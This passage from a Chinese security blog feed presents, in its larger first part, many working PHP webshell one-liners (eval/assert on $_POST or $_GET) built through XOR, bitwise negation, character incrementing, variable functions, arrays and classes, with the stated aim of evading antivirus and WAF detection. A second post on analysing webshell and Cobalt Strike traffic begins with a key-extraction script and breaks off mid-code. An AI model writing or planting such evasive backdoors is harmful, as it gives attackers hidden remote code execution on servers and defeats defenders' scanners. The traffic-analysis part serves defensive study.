class="variable">$_cC</span>);</span><br><span class="line">@<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure>

<h3 id="3-字符串运算"><a href="#3-字符串运算" class="headerlink" title="(3) 字符串运算"></a>(3) 字符串运算</h3><p><strong>异或取反运算</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);         <span class="comment">// $__的值为_POST</span></span><br><span class="line">@$&#123;<span class="variable">$__</span>&#125;[!<span class="variable">$_</span>]($&#123;<span class="variable">$__</span>&#125;[<span class="variable">$_</span>]);</span><br></pre></td></tr></table></figure>

<p>通过异或运算(<code>^</code>)、取反运算(<code>!</code>)的方式组成一个webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="title function_ invoke__">chr</span>(<span class="number">0x01</span>)^<span class="string">&#x27;`&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x13</span>)^<span class="string">&#x27;`&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x13</span>)^<span class="string">&#x27;`&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x05</span>)^<span class="string">&#x27;`&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x12</span>)^<span class="string">&#x27;`&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x14</span>)^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="title function_ invoke__">chr</span>(<span class="number">0x0D</span>)^<span class="string">&#x27;]&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x2F</span>)^<span class="string">&#x27;`&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x0E</span>)^<span class="string">&#x27;]&#x27;</span>).(<span class="title function_ invoke__">chr</span>(<span class="number">0x09</span>)^<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>再比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;999999999999999999999999&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%5COXU%11%1DfivjmbXXXd%10%02&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="comment">/*echo*/</span>(<span class="variable">$a</span>));<span class="comment">//password=aaa</span></span><br></pre></td></tr></table></figure>

<p><strong>自增运算</strong></p>
<p>因为在PHP中，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>,所以我们如果得到了其中的一个字母，通过这个字符就可以得到所有的字母。通过<code>$_=[];$_=@&quot;$_&quot;;;</code>得到<code>$_</code>为<code>Array</code>的字符串，那么就可以得到所有的字符串了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_</span>[_])); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p><strong>异或运算</strong></p>
<p>这种异或运算得到的webshell与上面讲的通过异或运算不完全一样。在特定的编码情况下，一些字符串经过异或运算就能够得到一些特定的函数，这些函数就可以用于构造webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$y</span>=~督耽孩^<span class="string">&#x27;(1987)&#x27;</span>;</span><br><span class="line"><span class="variable">$y</span>(<span class="variable">$_POST</span>[<span class="number">1987</span>]);</span><br></pre></td></tr></table></figure>

<p>上述的代码需要以<code>GBK</code>的方式保存,其中的<code>$y</code>的值为<code>assert</code>，这样就是一个典型的webshell了</p>
<p>再比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>=~<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%C4&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="comment">/*echo*/</span>(<span class="variable">$a</span>));<span class="comment">//password=a</span></span><br></pre></td></tr></table></figure>

<p>“~”的主要作用为取反，生成的不可见字符可以使用URL编码保存，这样检测时不会发现危险函数，也就不会发现我们的一句话木马</p>
<h3 id="4-其他处理方式"><a href="#4-其他处理方式" class="headerlink" title="(4) 其他处理方式"></a>(4) 其他处理方式</h3><p><strong>进制转换</strong>，比较常见，通过十六进制和八进制混用的方式代替<code>base64_decode</code>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$v230c590</span>=<span class="string">&quot;\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$v230c590</span>(.....</span><br></pre></td></tr></table></figure>

<p><strong>编码</strong>，其实在上面的例子中都有的已经利用了一些编码方式，常见的base64, chr, rot13, gzip, zlib等，但这种常见的编码、多层嵌套编码方式等都已经能被很多WAF识别了</p>
<p>字符串处理类的方式很多，任意的排列组合都可以产生新的东西</p>
<h2 id="2-关键字处理"><a href="#2-关键字处理" class="headerlink" title="2.关键字处理"></a>2.关键字处理</h2><p>很多软件只检查 $_POST，使用全局变量可以绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;_POST&#x27;</span>][<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>利用$_FILE</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_FILE</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>利用文件名，比如下述文件名为 no_assert.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;function&quot;</span>&#125;=<span class="title function_ invoke__">substr</span>(<span class="keyword">__FILE__</span>,-<span class="number">10</span>,-<span class="number">4</span>);;</span><br><span class="line">$&#123;<span class="string">&quot;command&quot;</span>&#125;=<span class="variable">$_POST</span>[cmd];</span><br><span class="line"><span class="variable">$function</span>(<span class="variable">$command</span>);</span><br></pre></td></tr></table></figure>

<p>通过目标服务器某些信息的唯一性，在其中进行取值拼接</p>
<h2 id="3-特殊字符干扰"><a href="#3-特殊字符干扰" class="headerlink" title="3.特殊字符干扰"></a>3.特殊字符干扰</h2><p>比较简单的如 \r\n\t null tab 进行干扰等等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = $_POST[&#x27;a&#x27;];</span><br><span class="line">$b = &quot;\n&quot;;</span><br><span class="line">eval($b.=$a);</span><br></pre></td></tr></table></figure>

<p>使用异或的方式也能产生一些特殊字符，绕过静态检测</p>
<h2 id="4-数组"><a href="#4-数组" class="headerlink" title="4.数组"></a>4.数组</h2><p>将循环的变量事先进行定义，可以降低查杀率，这是过狗的一个很实用的技巧，就是让狗以为你执行命令的参数为常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span>=<span class="variable">$key</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过定义数组，再交给 eval 等处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">233</span>   =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="number">42</span>    =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;SECQUAN&#x27;</span>],</span><br><span class="line">);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$array</span>[<span class="number">233</span>].<span class="variable">$array</span>[<span class="number">42</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用substr 和 explode 在字符串和数组之间处理，本质上也是字符串拼接的方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sss</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;123456eval(123456$_POST123456[&quot;1&quot;]);123456&#x27;</span>;</span><br><span class="line"><span class="variable">$ss</span>=<span class="keyword">array</span>().<span class="title function_ invoke__">explode</span>(<span class="string">&quot;123456&quot;</span>,<span class="variable">$s</span>)[<span class="number">1</span>].<span class="title function_ invoke__">explode</span>(<span class="string">&quot;123456&quot;</span>,<span class="variable">$s</span>)[<span class="number">2</span>].<span class="title function_ invoke__">explode</span>(<span class="string">&quot;123456&quot;</span>,<span class="variable">$s</span>)[<span class="number">3</span>];</span><br><span class="line"><span class="variable">$sss</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$ss</span>,<span class="number">5</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$sss</span>);</span><br></pre></td></tr></table></figure>

<p>多维数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="string">&quot;assexx&quot;</span>,<span class="string">&quot;rt&quot;</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="variable">$arrayName</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="variable">$b</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q&#x27;</span>])));</span><br></pre></td></tr></table></figure>

<h2 id="5-函数"><a href="#5-函数" class="headerlink" title="5.函数"></a>5.函数</h2><p>将取值赋值放入自定义函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">a</span>());</span><br></pre></td></tr></table></figure>

<p>结合可变函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">func</span>();</span><br><span class="line"><span class="variable">$a</span>($&#123;<span class="string">&quot;_PO&quot;</span>.<span class="string">&quot;ST&quot;</span>&#125;[<span class="string">&#x27;sz&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>为了能够逃避防护软件的查杀，很多webshell都会自己编写加密函数或者是字符串转换函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$password</span>]))&#123;</span><br><span class="line">    <span class="variable">$hex</span>=<span class="variable">$_POST</span>[<span class="variable">$password</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$hex</span>)-<span class="number">1</span>;<span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="variable">$string</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">hexdec</span>(<span class="variable">$hex</span>[<span class="variable">$i</span>].<span class="variable">$hex</span>[<span class="variable">$i</span>+<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>

<p>匿名函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//function __lambda_func()&#123;@eval($_POST[&#x27;f&#x27;]);&#125;</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;F9QivT1NUWyd&quot;</span>;</span><br><span class="line"><span class="variable">$v</span> = <span class="string">&quot;QGivV2YivWwoJ&quot;</span>;</span><br><span class="line"><span class="variable">$j</span> = <span class="string">&quot;mJ10pOw=iv=&quot;</span>;</span><br><span class="line"><span class="variable">$re</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;iv&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;sivtr_ivrepivlaivce&quot;</span>);</span><br><span class="line"><span class="variable">$ba</span> = <span class="variable">$re</span>(<span class="string">&quot;nf&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;bnfanfse6nf4_nfdecnfode&quot;</span>);</span><br><span class="line"><span class="variable">$fun</span> = <span class="variable">$re</span>(<span class="string">&quot;vf&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;cvfreavfte_fvfunctvfion&quot;</span>);</span><br><span class="line"><span class="variable">$vi</span> = <span class="variable">$fun</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$ba</span>(<span class="variable">$re</span>(<span class="string">&quot;iv&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$v</span> . <span class="variable">$s</span> . <span class="variable">$j</span>)));</span><br><span class="line"><span class="variable">$vi</span>();</span><br></pre></td></tr></table></figure>

<h2 id="6-类"><a href="#6-类" class="headerlink" title="6.类"></a>6.类</h2><p>使用类进行调用，可以降低静态检测的查杀率</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params"><span class="variable">$name</span>=<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">get</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$obj</span> -&gt; <span class="title function_ invoke__">setName</span>(<span class="string">&quot;<span class="subst">$_POST</span>[1]&quot;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="literal">null</span>.<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>

<p>经过测试，在类中传值，指定默认值的情况下会降低查杀率，很魔幻，感觉跟之前说的事先定义变量是一个道理</p>
<p>再进一步使用接口继承</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">lbw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span class="variable">$name</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">implements</span> <span class="title">lbw</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demo</span>=<span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getshell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>再扩展一下，可以先写类，然后子类继承等等，其实你写的越复杂，越接近业务逻辑代码，越容易绕过检测，然后你的一句话就活活写成了一页面向对象的代码</p>
<p>除了单纯的函数、类之间的调用，其实还可以发现，一些敏感的关键字，有时候写在类中就不会报毒</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evals</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$links</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$an</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;links = <span class="variable">$an</span>;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">&quot;\$title=1;&quot;</span>.<span class="variable language_">$this</span>-&gt;links);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$WebShell</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evals</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;An&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>针对回调函数，写在__construct&#x2F;__destruct 方法中也会降低报毒几率</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">\ReflectionClass</span>(<span class="string">&#x27;filter&#x27;</span>);</span><br><span class="line"><span class="variable">$instance</span> = <span class="variable">$class</span>-&gt;<span class="title function_ invoke__">newInstance</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$instance</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$this</span>-&gt;password, <span class="variable">$this</span>-&gt;data) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;password])) &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;password]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-文件混淆加密"><a href="#7-文件混淆加密" class="headerlink" title="7.文件混淆加密"></a>7.文件混淆加密</h2><p>由于文件加密后无法被各种检测软件的文件解析模块解析，后续的检测手段就都失效了，但可能会直接报为加密，所以有利有弊</p>
<p>参考</p>
<p><a href="https://su18.org/post/su18.php/#%E4%B8%89-%E5%8A%A8%E6%80%81%E6%80%A7%E6%8E%A2%E7%A9%B6">中国特色PHP大马 | 素十八</a></p>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>小结</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell流量分析</title>
    <url>/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>cs 流量</p>
<p>冰蝎流量</p>
<p>蚁剑流量</p>
<p>哥斯拉流量</p>
<span id="more"></span>

<h1 id="cs-流量"><a href="#cs-流量" class="headerlink" title="cs 流量"></a>cs 流量</h1><p>流量特征值</p>
<p>存在两个文件</p>
<p>.cobaltstrike.beacon_keys</p>
<p>pcapng</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_arguments</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;输入JAVA序列化文件 .cobaltstrike.beacon_keys 路径&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_RSA_PriKey</span>(<span class="params">SerializeKeyPath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(SerializeKeyPath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        pobj = javaobj.load(fd)</span><br><span class="line">    privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">    publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">    privateKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, privateKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line">    publicKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, publicKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    privateKey = privateKey.decode()</span><br><span class="line">    publicKey = publicKey.decode()</span><br><span class="line">    <span class="keyword">return</span> publicKey, privateKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_PK_Cipher</span>(<span class="params">privateKey</span>):</span><br><span class="line">    privateKey = RSA.import_key(privateKey.encode())</span><br><span class="line">    n_bytes 